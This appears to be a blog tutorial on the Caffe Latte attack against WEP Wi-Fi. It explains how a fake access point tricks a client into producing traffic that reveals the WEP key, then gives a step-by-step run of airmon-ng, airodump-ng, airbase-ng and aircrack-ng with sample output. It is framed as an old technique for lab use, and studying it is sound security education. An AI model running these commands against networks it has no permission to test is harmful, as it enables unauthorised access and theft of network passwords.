---
layout: post
title: Hacking Wifi | Caffe Latte Attack
---

Have you ever wondered how to hack a wifi network? Well, I show you one of the many attacks that exist, this is something old, we talked about it appearing in 2007 and that it is no longer viable, but is interesting and nice to show, I talk about the caffe latte attack, is an attack to get the password of a wifi access point that contains the WEP protocol.

![Alt text](/images/coffe.jpg?raw=true "Coffe-Latte-Attack")

<!-- more -->

# Introduction

How does it work?
Well it is simple, it is that in the WEP encryption the user has to authenticate while the access point does not, the lack of these 2 authentications causes that an attack can impersonate an AP by copying ESSID (name) and BSSID (mac adress) to get to pair with the client, and well, you can get to do interesting things, this attack only works in this protocol, in other protocols such as WPA and WPA2 will not work because here if you need authentication by the 2 parts

# Graphical Demonstration

The process is as follows:

![Alt text](/images/attackcoffelatte.png?raw=true "Coffe")


# Theoretical Process

1.- The attacker creates a Wifi access point (AP) with an ESSID exactly the same as one that is stored in a victim computer, this network will have Wep security but with a different key to the client because we do not know it.

![Alt text](/images/caffelate1screenshot.png?raw=true "CoffeLate1screenshot")

2.- Although the attacker and the victim have different encryption keys, the wep encryption allows to reach the phase of association of the client to the access point.

![Alt text](/images/caffelate2screenshot.png?raw=true "CoffeLate1screenshot")

3.- The authentication process of the client is done through the proposal of a "challenge", this is done from attacker to client, the "challenge" is nothing more than a cipher text with the shared key, the client will answer the challenge and the fake access point will say that it is valid although it is not true, then it will send an "Authentication Success".


4.- Once the authentication process is finished, the client is associated to the access point.


5.-Once the association is established, the client will try to obtain an ip via DHCP but the fake access point will not have DHCP and after a timeout the client OS will automatically assign a static ip corresponding to the APIPA range (169.254.0.1 to 169.254.255.255.254 with mask 255.255.0.0).

![Alt text](/images/caffelate3screenshot.png?raw=true "CoffeLate1screenshot")

6.- The client will send free ARPS informing of the static ip that has been self-assigned to avoid problems in the network.

# Obtaining the password :)))

7.- Finally, from the free ARP the AP Fake will introduce in the network ARP requests from any ip with destination ip to the client ip, the client will respond to the ARP packets that are arriving and in a short time we will have enough traffic to crack the WEP password.

![Alt text](/images/caffelate4screenshot.png?raw=true "CoffeLate1screenshot")

# Small explanations

Simple, right, well, I want to tell you a few things before going to practice, the first thing is to tell you that, although this method seems very easy to perform, currently it is no longer, this protocol has been discontinued causing this attack is no longer viable, even so you can make a test environment to test this, I assure you that it is quite fun to perform

The second thing is that, to perform all these wireless network attacks, you will need to have a network card that MUST have monitor mode, be sure to check if they have this mode before buying one, and preferably a good antenna to pick up signal, traffic. Something like this:

![Alt text](/images/network-card.jpg?raw=true "Network-Card")

I would recommend you to buy the one you like the most

This is the one I have and the one I recommend the most :) :

 ------------------------------------------------------------------------------
|https://www.amazon.com/-/es/Adaptador-Link-Wireless-Negro-Blanco/dp/B002SZEOLG|
 ------------------------------------------------------------------------------

# Practice

## Network Interface
First we will have to see our network interfaces, for it we write ifconfig in our console and several options will appear to us, we choose the one that has the option for monitor mode, in my case it appears as wlan1.


``` console
$ ifconfig

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:3c:5a:be:41  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.126.136  netmask 255.255.255.0  broadcast 192.168.126.255
        inet6 fe80::ad27:5aab:c811:2dbd  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:b3:0d:18  txqueuelen 1000  (Ethernet)
        RX packets 260062  bytes 288327227 (274.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 134684  bytes 24893626 (23.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4679  bytes 23032556 (21.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4679  bytes 23032556 (21.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: **************************** *********
 
```

Once we start the card in monitor mode and we can see it in the network interface with ifconfig (seen in the previous step), we will type this command: 
airmon-ng start wlan1

``` console
$ airmon-ng start wlan1
Found 3 processes that could cause t rouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!
-e
PID     Name
2731    NetworkManager
2906    wpa_supplicant
3078     dhclient
Process with PID 3078 (dhclient) is running on interface wlano


Interface               Chipset                      Driver

wlane                   Intel 6230                   iwlwifi - [phy0]
wlan1                   Realtek RTL8187L             rt19197 - [phy1]
                                  monitor mode enabled on mono0)

```

## Monitoring the traffic

With the command airodump-ng we will start to listen and collect all the traffic that circulates through the air, we will see how initially there is no wifi network called "caffelatte" and after executing>.

The -c 7 option is to filter the searches to channel 7, the -w "namefile" option is to save the capture in the "namefile" file.

``` console
$ airodump-ng -c 7 -w caffelattecapture mon0
```

## Dummy access point

We create the fake AP to perform the attack with the airbase-ng program we will create the fake access point.

Options:
The -c 7 option will create the access point on channel 7. 
Option -a XX:XX:XX:XX:XX:XX:XX:XX:XX is used to create the access point with this mac address
The -e "XX" option is used to give the name (ESSID) "XX" to the network.
The -L option is used to make airbase-ng adopt the caffelatte attack configuration.
The -W 1 option is used for the network to adopt WEP encryption, if there is a 0 the network will be open.
The -x "XX" option is optional, it is used to send "XX" packets per second once the attack starts.

airbase-ng -c 7 -a XX:XX:XX:XX:XX:XX:XX:XX -e "caffelatte" -L -W 1 -x 100 mon0


``` console
$ airbase-ng -с 7 -а 58:6D:8F:AE:BF:F0 -е "CaffeLatte" -L -W - X 100 mono
12:25:25  Created tap interface ato
12:25:25  Trying to set MTU on ato to 1500
12:25:25  Access Point with BSSID 58:6d:8F:AE:BF:F0 started.

```

## Start the Attack :)))

When the client connects to the network it will associate to it and start the attack, the status of the attack will be shown in the airbase-ng terminal.


``` console
12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: "CaffeLatte"
12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: "CaffeLatte"
12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: "CaffeLatte"
12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: "CaffeLatte"
12:20:15   Client 64:70:02:28:4E:2F associated (WEP) to ESSID: "CaffeLatte"
12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: "CaffeLatte"
12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: "CaffeLatte"
12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: "CaffeLatte"
12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: "CaffeLatte"
12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: "CaffeLatte"
12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: "CaffeLatte"
12:20:15   Client 64:70:02:2b:4E:2F associated (WEP) to ESSID: "CaffeLatte"
12:20:15   Client 64:70:02:28:4E:2F associated (WEP) to ESSID: "CaffeLatte"
12:20:16   Starting Caffe-Latte attack against 64:70:02:28:4E:2F at 100 pps.
```

We will see in airodump-ng that the client has connected and starts transmitting frames.

``` console
CH 7 1[ Elapsed: 36 S 1[ 2013-09-05 12:21
BSSID                PWR RXQ Beacons   #Data, #/s CH MB   ENC CIPHER AUTH ESSID
58:6D:8F:AE:BF:F0    O   O   741       61     1   7  54   WEP WEP         CaffeLatte

BSSID                STATION            PWR   Rate    Lost    Frames  Probe
58:6D:8F:AE:BF:F0    64:0B:3A:1C:**:**  -40   0 - 1      0      1836
```

## Decrypting the key


When we have captured a high number of initialization vector packets (IV) we will proceed to run aircrack-ng to obtain the key

with the option -e "xx" we will decrypt only the network with the name (ESSID) "xx".

aircrack-ng -e caffelatte caffelattecapture*.cap

``` console
$ aircrack-ng -e caffelatte caffelattecapture*.cap
```
